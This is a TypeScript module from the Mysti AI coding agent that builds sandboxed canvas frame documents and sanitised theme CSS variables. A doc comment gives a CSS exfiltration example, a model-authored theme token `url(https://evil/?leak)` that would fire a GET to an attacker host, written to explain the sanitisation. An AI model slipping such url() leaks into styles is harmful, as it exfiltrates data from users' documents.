/**
 * Mysti - AI Coding Agent
 * Copyright (c) 2025 DeepMyst Inc. All rights reserved.
 *
 * Author: Baha Abunojaim <baha@deepmyst.com>
 * Website: https://www.deepmyst.com/mysti
 *
 * This file is part of Mysti, licensed under the Apache License, Version 2.0.
 * See the LICENSE file in the project root for full license terms.
 *
 * SPDX-License-Identifier: Apache-2.0
 *
 * Plan 22 2.9 / 3.4 - the webview's adapter onto the ONE sandbox builder.
 *
 * `media/canvas/canvas.js` carried a hand-written JS mirror of
 * `CanvasSandbox.ts` (`buildThemeCssVars` + `buildPageSrcdoc`) and had already
 * drifted three ways: no `asset://` resolution, a missing `--theme-space-unit`,
 * and a dropped page size. Plan 22 first principle 9 - "one implementation per
 * seam" - names that mirror as the reason this subsystem diverged at all.
 *
 * So this module builds nothing. It imports `buildPageDocument`, maps the
 * webview's runtime bag onto the builder's slots, and stops. Everything else
 * here exists because the PARENT needs the same theme the FRAME gets, and
 * `themeTokenMap` is the single place that decides what a token means.
 */

import {
  buildPageDocument,
  pageRenderMode,
  themeTokenMap,
  type PageRenderMode,
} from '../../managers/CanvasSandbox';
import { sanitizeStyleValue } from './preview';
import type { ArtifactPage, CanvasFormatSpec, DesignTheme } from '../../types';

export { DOC_SANDBOX_INNER_CSP, SANDBOX_INNER_CSP } from '../../managers/CanvasSandbox';

export interface FrameRuntime {
  /** React, ReactDOM and the UI primitives - fetched once, reused by every frame. */
  scripts: string[];
  /** The harness: doc interpreter + `MessageChannel` port. */
  harness: string;
  /**
   * Babel standalone. Fetched ONLY when some artboard is still a legacy JSX
   * page, and passed in its own slot so `buildPageDocument` can guarantee a
   * document-model frame never ships the 2.98 MB compiler.
   */
  babel?: string;
}

export interface FrameDocOptions {
  page: ArtifactPage;
  theme: DesignTheme;
  format: CanvasFormatSpec;
  runtime: FrameRuntime;
  /** `asset://...` to a URL the frame may load. */
  resolveAsset?: (ref: string) => string;
  /**
   * The webview's `cspSource`, so `asset://` refs resolved to a
   * `vscode-webview://...` URI survive the hardened doc-mode `img-src`.
   */
  imgSources?: readonly string[];
  /**
   * The PARENT webview's CSP nonce. A `srcdoc` frame inherits the parent policy
   * (`script-src 'nonce-…' <cspSource>`), and the frame's own meta cannot widen
   * it — so without this every script in the frame is refused and the artboard
   * renders blank over its static preview.
   */
  nonce?: string;
  csp?: string | false;
}

/** How this artboard's body is delivered - `doc`, or a legacy `jsx`/`html` source. */
export function frameRenderMode(page: ArtifactPage): PageRenderMode {
  return pageRenderMode(page);
}

/**
 * True when this artboard's SOURCE still needs a JSX compiler to render.
 *
 * The whole point of Phase 2: this is false for every document-model page, so
 * `babel.min.js` - 2,983,904 of the 3,144,476 bytes the old renderer re-inlined
 * into a fresh `srcdoc` on EVERY edit - is fetched for no one until a design
 * actually contains a page the compiler could not accept.
 *
 * A page-level fact, NOT a per-renderer one: inside the panel the answer is
 * moot, because a `srcdoc` artboard inherits the shell's eval-free policy and
 * `buildPageDocument` therefore ships such a page a static notice with no
 * compiler at all (see `canEval` in `CanvasSandbox.ts`). Only the standalone
 * renderers - export bundle, Present, PNG capture - can act on this.
 */
export function needsBabel(page: ArtifactPage): boolean {
  return frameRenderMode(page) === 'jsx';
}

/** Build the frame document for one artboard. A pass-through, by design. */
export function buildFrameDocument(opts: FrameDocOptions): string {
  return buildPageDocument({
    page: opts.page,
    theme: opts.theme,
    format: opts.format,
    runtime: {
      headScripts: opts.runtime.scripts,
      babel: opts.runtime.babel,
      harness: opts.runtime.harness,
    },
    resolveAsset: opts.resolveAsset,
    imgSources: opts.imgSources,
    nonce: opts.nonce,
    csp: opts.csp,
  });
}

/* ------------------------- theme vars for the parent ------------------------- */

/**
 * The theme as `--theme-*` custom properties for a PARENT-side preview tile.
 *
 * Derived from {@link themeTokenMap} - the same function that bakes the frame's
 * `:root` block and fills `mount.themeTokens` - so the static preview and the
 * live frame cannot disagree about what a token means. The drift that made the
 * JS mirror lose `--theme-space-unit` is structurally unavailable here.
 *
 * Values are sanitized, which the frame does not need to do and the parent
 * does: a `theme.set` op is model-authored, and a token like
 * `url(https://evil/?leak)` would otherwise be substituted by the CSS engine
 * into an allowlisted `background: var(--theme-color-primary)` and fire a GET
 * from the PARENT document - laundering the exact channel `preview.ts` refuses
 * to open directly.
 */
export function themeCssVars(theme: DesignTheme): Record<string, string> {
  const out: Record<string, string> = {};
  for (const [token, rawValue] of Object.entries(themeTokenMap(theme))) {
    const name = `--theme-${token}`;
    const value = sanitizeStyleValue(name, String(rawValue));
    if (value !== null) { out[name] = value; }
  }
  return out;
}
